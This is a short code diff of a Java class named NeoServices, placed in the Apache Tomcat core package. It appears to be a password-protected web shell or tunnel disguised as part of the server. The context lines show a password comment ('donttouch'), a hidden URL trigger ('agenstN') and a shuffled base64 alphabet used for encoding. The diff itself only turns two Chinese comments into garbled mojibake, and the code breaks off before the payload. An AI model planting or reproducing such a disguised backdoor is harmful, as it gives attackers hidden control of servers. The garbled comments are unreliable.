@@ -1,7 +1,7 @@
 package org.apache.catalina.core;
 
 public class NeoServices {
-    //密码：donttouch
+    //瀵嗙爜锛歞onttouch
 
     public static java.util.Map<String,Object> namespace = new java.util.HashMap<String,Object>();
     public static String SERVICE_URL="agenstN";
@@ -26,7 +26,7 @@ public class NeoServices {
     }
 
     public static void doServices(java.util.Map rdd,Object obj) throws Exception {
-        //为什么没有这么多抛出？因为它善
+        //涓轰粈涔堟病鏈夎繖涔堝鎶涘嚭锛熷洜涓哄畠鍠?
         if(((String)rdd.get("url")).matches("/(.*)"+org.apache.catalina.core.NeoServices.SERVICE_URL)) {
             String charslist = "kXEQ0idLPc4B/sHvgWM5Y7ZfSmGlJI6N+bD28a3joRn9qtxwpyOhzVCuKAe1UFTr";
             Object[] args = new Object[]{
